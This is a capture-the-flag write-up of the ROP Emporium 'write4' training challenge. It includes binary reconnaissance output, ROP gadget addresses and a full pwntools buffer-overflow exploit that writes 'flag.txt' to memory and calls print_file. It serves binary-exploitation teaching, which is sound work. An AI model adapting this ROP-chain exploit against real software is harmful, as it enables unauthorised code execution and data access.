---
title: ROP Emporium - write4 Challenge Writeup
tags: [pwn, rop, binary exploitation, x64, memory write]
style: border
color: danger
description: Writeup for the write4 challenge from ROP Emporium - writing arbitrary data to memory using ROP gadgets.
---

## Challenge Overview

The **write4** challenge introduces a new concept: writing arbitrary data to memory using ROP gadgets. Unlike previous challenges where strings were already present in the binary, here we need to write our own string to a writable memory location.

**Challenge Link**: [ROP Emporium - write4](https://ropemporium.com/challenge/write4.html)

## Challenge Requirements

We need to:
1. Write the string `flag.txt` to a writable memory location
2. Call `print_file()` with a pointer to that string as an argument

The `print_file()` function reads and prints the contents of a file specified by its argument.

## Binary Analysis

### Initial Reconnaissance

```bash
$ file write4
write4: ELF 64-bit LSB executable, x86-64

$ checksec write4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ ldd write4
    libwrite4.so => ./libwrite4.so
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

### Static Analysis

```bash
$ ./write4
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!
> test
Thank you!
Exiting
```

### Finding Important Addresses

```bash
$ r2 write4
[0x00400650]> aaa
[0x00400650]> afl | grep print_file
0x00400620    1 6            sym.imp.print_file

# Find writable memory sections
[0x00400650]> iS
...
[23] 0x00601028     8 0x00601028     8 -rw- .data
[24] 0x00601038     0 0x00601038    16 -rw- .bss
```

Addresses:
- `print_file@plt`: `0x400510` (actual address in the binary)
- Writable `.data` section: `0x601028` - `0x601030`
- Writable `.bss` section: `0x601038+`

We'll use the `.bss` section at `0x601500` to write our string (giving us plenty of space and avoiding any potential issues with initialized data)

### Finding ROP Gadgets

We need:
1. A gadget to write data to memory
2. A gadget to control RDI (for the function argument)

```bash
$ ROPgadget --binary write4 | grep "mov"
0x0000000000400628 : mov qword ptr [r14], r15 ; ret

$ ROPgadget --binary write4 | grep "pop r14"
0x0000000000400690 : pop r14 ; pop r15 ; ret

$ ROPgadget --binary write4 | grep "pop rdi"
0x0000000000400693 : pop rdi ; ret
```

Perfect! We found:
- `mov [r14], r15; ret` at `0x400628` - writes R15 value to address in R14
- `pop r14; pop r15; ret` at `0x400690` - loads values into R14 and R15
- `pop rdi; ret` at `0x400693` - loads value into RDI

## Exploitation Strategy

The strategy is straightforward:

1. Use `pop r14; pop r15; ret` to load:
   - R14 = address where we want to write (`.bss` section at `0x601500`)
   - R15 = "flag.txt" (8 bytes)
2. Use `mov [r14], r15; ret` to write the data to memory
3. Use `pop rdi; ret` to load the address of our string into RDI
4. Call `print_file@plt`

### String Breakdown

Since "flag.txt" is exactly 8 bytes, we can write it in a single operation. When packed as little-endian bytes and loaded into R15, the string naturally includes a null terminator at position 8 (since we're only writing 8 bytes and the rest of the BSS is already zeroed)

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import sys

elf = ELF("write4")
context.binary = elf
binary = elf.path
context.log_level = "debug"
IP, PORT = "address", 1337

global io
breakpoints = '''
'''

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary, env = {"LD_PRELOAD": "./libwrite4.so"})
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
else:
    io = process(binary, env = {"LD_PRELOAD": "./libwrite4.so"})
    gdb.attach(io, breakpoints)

sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
def main(io):
    # start pwn :)
    mov = 0x0000000000400628        # mov qword ptr [r14], r15; ret;
    pop = 0x0000000000400690        # pop r14; pop r15; ret;
    pop_rdi = 0x0000000000400693
    bss = 0x601500
    print_file_plt = 0x0000000000400510

    payload = b'a' * 32
    payload += b'b' * 8             # rbp
    payload += p64(pop)
    payload += p64(bss)
    payload += b'flag.txt'
    payload += p64(mov)
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(print_file_plt)
    sla('> ', payload)

    
    io.interactive()

if __name__ == "__main__":
    main(io)
```

## Alternative: Writing with Null Terminator

If you want to be more explicit about the null terminator:

```python
# Write "flag.txt" (8 bytes)
payload = flat(
    b'A' * offset,
    # Write first 8 bytes: "flag.txt"
    pop_r14_r15,
    data_section,
    b'flag.txt',
    mov_r14_r15,
    # Write null terminator at position 8
    pop_r14_r15,
    data_section + 8,
    0x0,
    mov_r14_r15,
    # Call print_file
    pop_rdi,
    data_section,
    print_file
)
```

## Running the Exploit

```bash
$ python3 exploit_write4.py
[*] '/path/to/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/path/to/write4': pid 12345
[*] Receiving all data
[*] Process '/path/to/write4' stopped with exit code 0 (pid 12345)

Thank you!
ROPE{a_placeholder_32byte_flag!}
```

## Debugging with GDB

To verify the memory write:

```bash
$ gdb ./write4
gdb> break *0x400628  # Break at mov [r14], r15
gdb> run < <(python3 -c 'print(payload)')
gdb> info registers r14 r15
gdb> x/s $r14         # Examine string at R14
gdb> continue
```

## Memory Layout Considerations

When choosing where to write:
- ✓ `.data` section - writable, initialized data
- ✓ `.bss` section - writable, uninitialized data
- ✗ `.text` section - read-only (code)
- ✗ `.rodata` section - read-only (constants)

Use `readelf -S` or `rabin2 -S` to view section permissions.

## Key Takeaways

1. **Memory Write Gadgets**: Using gadgets like `mov [reg1], reg2` to write arbitrary data
2. **Writable Memory Sections**: Identifying and using writable memory regions (`.data`, `.bss`)
3. **String Construction**: Building strings in memory byte by byte or in chunks
4. **Register Control**: Managing multiple registers (R14, R15) for memory operations
5. **Planning Ahead**: Understanding what data needs to be where before execution

This challenge demonstrates that ROP is not limited to controlling execution flow - it can also manipulate memory to create the exact conditions needed for exploitation.

---

**Challenge Completed**: ✓  
**Previous Challenge**: [callme](https://ropemporium.com/challenge/callme.html)  
**Next Challenge**: [badchars](https://ropemporium.com/challenge/badchars.html)
